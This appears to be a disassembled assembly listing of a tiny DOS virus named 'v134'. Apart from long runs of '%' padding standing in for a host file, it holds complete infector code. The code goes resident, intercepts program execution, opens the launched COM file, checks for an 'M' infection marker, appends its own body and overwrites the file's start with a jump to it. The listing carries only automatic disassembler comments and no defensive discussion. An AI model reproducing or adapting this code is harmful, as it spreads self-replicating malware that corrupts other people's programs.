.286     

data_1e     equ 0FEE0h          ; (0000:FEE0=2120h)
data_2e     equ 0FFh            ; (8841:00FF=0)
data_7e     equ 8220h           ; (8841:8220=0)
data_8e     equ 8420h           ; (8841:8420=0)
data_9e     equ 9193h           ; (8841:9193=0)

code        segment byte public
        assume  cs:code, ds:code

        org 100h

v134        proc    far

start:
        jmp loc_1           ; (08D4)
        dec bp
        mov es,[bp+si-676Dh]
        mov al,ds:data_8e[bx+si]    ; (8841:8420=0)
        mov bx,ds:data_7e[bx]   ; (8841:8220=0)
        mov ds:data_9e[bx+si],dl    ; (8841:9193=0)
        mov es,[bp+si+0A0Dh]
        and al,0B4h
        or  data_6[di],cx       ; (8841:0316=2525h)
        add bp,cx
        and bp,cx
        db  ' %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%'
data_5      dd  25252525h       ;  xref 8841:0941
        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%'


data_6      dw  2525h           ; Data table (indexed access)
                        ;  xref 8841:011A
        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'





        db  '%%%%%%%%%%%%%%%%%%%%%%%%'



        db  0EBh, 17h, 90h, 8Bh
loc_1:                      ;  xref 8841:0100
        mov si,data_2e      ; (8841:00FF=0)
        mov di,offset ds:[100h] ; (8841:0100=0E9h)
        mov bx,630h
        mov cx,50h
        add si,[si+2]
        push    di
        movsw               ; Mov [si] to es:[di]
        movsw               ; Mov [si] to es:[di]
        mov es,cx
        cmpsb               ; Cmp [si] to es:[di]
        jz  loc_3           ; Jump if zero
        dec si
        dec di
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        mov es,cx
        xchg    ax,bx
        xchg    ax,cx
loc_2:                      ;  xref 8841:08FA
        xchg    ax,cx
        xchg    ax,es:data_1e[di]   ; (0000:FEE0=2120h)
        stosw               ; Store ax to es:[di]
        jcxz    loc_2           ; Jump if cx=0
        xchg    ax,bx
loc_3:                      ;  xref 8841:08E9
        push    ds
        pop es
        retn
        cmp ax,4B00h
        jne loc_5           ; Jump if not equal
        pusha
        push    ds
        push    es
        mov ax,3D02h
        call    sub_2           ; (0949)
        jc  loc_4           ; Jump if carry Set
        cbw             ; Convrt byte to word
        cwd             ; Word to double word
        mov bx,si
        mov ds,ax
        mov es,ax
        mov ah,3Fh          ; '?'
        int 69h
        mov al,4Dh          ; 'M'
        repne   scasb           ; Rep zf=0+cx >0 Scan es:[di] for al
        jz  loc_4           ; Jump if zero
        mov al,2
        call    sub_1           ; (0946)
        mov cl,86h
        int 69h
        mov al,0E9h
        stosb               ; Store al to es:[di]
        inc si
        xchg    ax,si
        stosw               ; Store ax to es:[di]
        mov al,4Dh          ; 'M'
        stosb               ; Store al to es:[di]
        xchg    ax,dx
        call    sub_1           ; (0946)
        int 69h
loc_4:                      ;  xref 8841:0910, 0922
        pop es
        pop ds
        popa
loc_5:                      ;  xref 8841:0903
        jmp cs:data_5       ; (8841:01A4=2525h)

v134        endp

;��������������������������������������������������������������������������
;                  SUBROUTINE
;
;         Called from:   8841:0926, 0937
;��������������������������������������������������������������������������

sub_1       proc    near
        mov ah,42h          ; 'B'
        cwd             ; Word to double word

;���� External Entry into Subroutine ��������������������������������������
;
;         Called from:   8841:090D

sub_2:
        xor cx,cx           ; Zero register
        int 69h
        mov cl,4
        xchg    ax,si
        mov ax,4060h
        xor di,di           ; Zero register
        retn
sub_1       endp


code        ends



        end start
